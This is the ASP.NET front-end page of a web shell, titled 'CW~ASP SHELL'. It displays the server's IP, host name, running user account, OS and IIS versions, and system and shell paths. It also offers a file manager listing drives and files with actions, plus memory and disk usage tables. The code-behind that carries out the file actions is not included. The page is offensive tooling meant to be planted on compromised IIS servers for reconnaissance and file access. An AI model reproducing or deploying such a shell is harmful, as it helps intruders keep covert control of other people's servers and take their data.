<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="_Default" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <title>ASP SHELL</title>
    <style type="text/css">
        .auto-style1 {
            margin-left: 680px;
        }
    </style>
</head>
<body style="background-color:black;color:green;">
    <form id="form1" runat="server">
    <div>
        <h1 style="text-align:center">CW~ASP SHELL</h1>
    </div>


    <div>[ Web Server Information ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></div><br/>
    <table>
        <tr>
            <td><b style="color:red">Server IP:</b><%=Request.ServerVariables["LOCAL_ADDR"] %> - <b style="color:red">Client IP:</b><%=Request.ServerVariables["REMOTE_ADDR"] %> - <b style="color:red">HostName:</b><%= Environment.MachineName%> - <b style="color:red">UserName:</b><%=Environment.UserName %></td>
        </tr>
        <tr>
            <td><b style="color:red">OS Version:</b><%=Environment.OSVersion %><b style="color:red">IIS Version:</b><%=Request.ServerVariables["SERVER_SOFTWARE"] %></td>
        </tr>
        <tr>
            <td style="color:white"><b style="color:red">System Dir:</b><%=Environment.SystemDirectory %><b style="color:red">Shell Dir:</b><%=Request.ServerVariables["PATH_TRANSLATED"] %></td>
        </tr>
        <tr>
            <td><b style="color:red">Hardware Info:</b><%=Environment.GetEnvironmentVariable("NUMBER_OF_PROCESSORS") %>CPU-<%=Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER") %> - <b style="color:red">UpTime:</b><%= Uptime.ToNiceString() %></td>
        </tr>
    </table>
    <br />
<hr />
        
        <div>
            <h1 style="text-align:center">File Manager</h1>
        </div>
        <div>
            <h2 style="text-align:center"><% ListDrive(); %></h2>
        </div>
        <br />
        <br />

    <table border="1" style="border-color:red;width:100%">
        <thead>
            <tr>
                <th>
                    Name
                </th>
                <th>
                    Size
                </th>
                <th>
                    Modify
                </th>
                <th>
                    Actions
                </th>
            </tr>
        </thead>
        <tbody>
            <% ListDirandFile(); %>
        </tbody>
    </table>


    <div>
     

	<h2>Memory Usage</h2>
	<table border="1" style="border-color:red">
		<thead>
			<tr>
				<th>Type</th>
				<th>Usage</th>
				<th>Free</th>
				<th>Used</th>
				<th>Size</th>
			</tr>
		</thead>
		<tbody>
			<tr>
				<td>Physical memory</td>
				<td><%= ((_computerInfo.TotalPhysicalMemory - _computerInfo.AvailablePhysicalMemory) / (float)_computerInfo.TotalPhysicalMemory * 100.0).ToString("0.00") %>%</td>
				<td><%= ToSizeString(_computerInfo.AvailablePhysicalMemory)%></td>
				<td><%= ToSizeString(_computerInfo.TotalPhysicalMemory - _computerInfo.AvailablePhysicalMemory) %></td>
				<td><%= ToSizeString(_computerInfo.TotalPhysicalMemory) %></td>
			</tr>
			<tr>
				<td>Swap</td>
				<td><%= ToSizeString(_computerInfo.AvailableVirtualMemory) %></td>
				<td><%= ToSizeString(_computerInfo.TotalVirtualMemory - _computerInfo.AvailableVirtualMemory) %></td>
				<td><%= ToSizeString(_computerInfo.TotalVirtualMemory) %></td>
			</tr>
		</tbody>
	</table>

	<h2>Mounted Filesystems</h2>
	<table border="1" style="border-color:red">
		<thead>
			<tr>
				<th>Mountpoint</th>
				<th>Usage</th>
				<th>Free</th>
				<th>Used</th>
				<th>Size</th>
			</tr>
		</thead>
		<tbody>
			<tr>
				<td>C:</td>
				<td><%= (((_driveInfo.TotalSize - _driveInfo.TotalFreeSpace) / (float)_driveInfo.TotalSize) * 100.0).ToString("0.00") %>%</td>
				<td><%= ToSizeString(_driveInfo.AvailableFreeSpace) %></td>
				<td><%= ToSizeString(_driveInfo.TotalSize - _driveInfo.TotalFreeSpace) %></td>
				<td><%= ToSizeString(_driveInfo.TotalSize) %></td>
			</tr>
		</tbody>
	</table>
    </div>
  
    </form>
</body>
</html>
